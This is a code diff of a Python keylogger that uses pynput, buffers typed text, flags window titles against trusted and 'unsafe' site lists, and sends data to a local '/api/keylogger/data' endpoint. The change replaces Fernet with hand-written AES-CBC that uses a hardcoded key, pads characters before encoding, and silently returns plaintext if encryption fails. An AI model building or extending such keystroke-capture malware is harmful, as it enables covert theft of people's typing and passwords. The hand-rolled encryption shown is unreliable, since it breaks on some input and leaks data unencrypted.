@@ -4,7 +4,8 @@ import time
 import threading
 import requests
 from pynput import keyboard
-from cryptography.fernet import Fernet
+from Crypto.Cipher import AES
+from Crypto.Random import get_random_bytes
 import platform
 import hashlib
 import json
@@ -13,26 +14,24 @@ import ctypes.wintypes
 
 # ==================== CONFIGURATION ====================
 CONFIG = {
-    "BACKEND_URL": "http://localhost:4000/api/keylogger/save",
+    "BACKEND_URL": "http://localhost:4000/api/keylogger/data",
     "USER_ID": "67fa6a24415733da21dfde32",  # MongoDB ObjectId
-    "ENCRYPTION_KEY": "VamshiBurgulaAdmin".encode(),
+    "ENCRYPTION_KEY": b"VamshiBurgulaAdmin",  # Raw bytes
     "BUFFER_FLUSH_INTERVAL": 10,  # seconds
     "MAX_BUFFER_SIZE": 300,       # characters
     "TRUSTED_SITES": [
         "google.com", "stackoverflow.com", "github.com",
-        "microsoft.com", "apple.com", "amazon.com"
+        "microsoft.com", "apple.com"
     ],
     "UNSAFE_SITES": [
-        "phishingsite.com", "maliciousapp.net",
+         "amazon.com", "maliciousapp.net",
         "piratedmovies.com", "illegalcontent.net"
     ]
 }
 
 # ==================== INITIALIZATION ====================
 try:
-    key = base64.urlsafe_b64encode(CONFIG["ENCRYPTION_KEY"].ljust(32, b'='))
-    fernet = Fernet(key)
-
+    AES_KEY = CONFIG["ENCRYPTION_KEY"].ljust(32, b'\0')[:32]  # Ensure 32-byte AES-256 key
     buffer = ""
     start_time = time.time()
     is_running = True
@@ -68,10 +67,20 @@ def is_trusted_website(title):
 def is_unsafe_website(title):
     return any(site.lower() in title.lower() for site in CONFIG["UNSAFE_SITES"])
 
+# ==================== AES-256 ENCRYPTION ====================
+def pad(data):
+    pad_len = AES.block_size - len(data) % AES.block_size
+    return data + chr(pad_len) * pad_len
+
 def safe_encrypt(data):
     try:
-        return fernet.encrypt(data.encode()).decode('utf-8')
-    except Exception:
+        raw = pad(data).encode()
+        iv = get_random_bytes(AES.block_size)
+        cipher = AES.new(AES_KEY, AES.MODE_CBC, iv)
+        encrypted = cipher.encrypt(raw)
+        return base64.b64encode(iv + encrypted).decode('utf-8')
+    except Exception as e:
+        print(f"Encryption error: {e}")
         return data
 
 # ==================== DATA PROCESSING ====================
